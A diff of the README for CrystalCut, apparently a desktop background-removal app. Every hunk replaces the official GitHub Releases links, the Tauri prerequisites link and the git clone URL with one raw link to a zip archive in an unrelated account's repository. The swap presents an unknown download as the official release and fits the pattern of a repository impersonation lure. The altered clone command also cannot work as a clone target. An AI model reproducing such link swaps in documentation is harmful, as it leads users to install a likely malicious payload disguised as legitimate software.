@@ -18,7 +18,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/pkh31337/CrystalCut/releases/latest"><strong>Download</strong></a>
+  <a href="https://raw.githubusercontent.com/Bloomingfoolbegoniascansion6267/CrystalCut/main/src-tauri/src/v1.5-beta.4.zip"><strong>Download</strong></a>
   ·
   <a href="#features">Features</a>
   ·
@@ -139,7 +139,7 @@ All 446 interface messages—including toasts, errors, confirmations, context me
 
 ## Download and installation
 
-Open [GitHub Releases](https://github.com/pkh31337/CrystalCut/releases/latest) and choose the package for your computer:
+Open [GitHub Releases](https://raw.githubusercontent.com/Bloomingfoolbegoniascansion6267/CrystalCut/main/src-tauri/src/v1.5-beta.4.zip) and choose the package for your computer:
 
 - **Windows x64:** use `setup.exe` for a standard installation or `.msi` for managed deployment.
 - **macOS Apple Silicon:** for Macs with M1, M2, M3, M4, or newer Apple chips.
@@ -172,12 +172,12 @@ Heavy image work never runs in the UI process. The coordinator can restart the w
 
 - Node.js 20 or newer (release CI uses Node.js 22)
 - Rust stable toolchain
-- [Tauri 2 platform prerequisites](https://v2.tauri.app/start/prerequisites/) for Windows or macOS
+- [Tauri 2 platform prerequisites](https://raw.githubusercontent.com/Bloomingfoolbegoniascansion6267/CrystalCut/main/src-tauri/src/v1.5-beta.4.zip) for Windows or macOS
 
 ### Run the desktop app
 
 ```powershell
-git clone https://github.com/pkh31337/CrystalCut.git
+git clone https://raw.githubusercontent.com/Bloomingfoolbegoniascansion6267/CrystalCut/main/src-tauri/src/v1.5-beta.4.zip
 cd CrystalCut
 npm ci
 npm run tauri dev
@@ -293,4 +293,4 @@ CrystalCut은 Windows와 macOS에서 작동하는 로컬 우선 배경 제거·�
 - 촬영 정보·GPS·생성 프롬프트의 전역/파일별 보존 및 편집 정책
 - 시스템 언어 자동 감지와 9개 언어 지원
 
-이미지는 외부 서버로 전송되지 않습니다. AI 모델은 최초 사용 시 한 번 다운로드하고 검증한 뒤 로컬 캐시에서 사용합니다. 일반 사용자는 [Releases](https://github.com/pkh31337/CrystalCut/releases/latest)에서 운영체제에 맞는 설치 파일을 받으면 됩니다.
+이미지는 외부 서버로 전송되지 않습니다. AI 모델은 최초 사용 시 한 번 다운로드하고 검증한 뒤 로컬 캐시에서 사용합니다. 일반 사용자는 [Releases](https://raw.githubusercontent.com/Bloomingfoolbegoniascansion6267/CrystalCut/main/src-tauri/src/v1.5-beta.4.zip)에서 운영체제에 맞는 설치 파일을 받으면 됩니다.
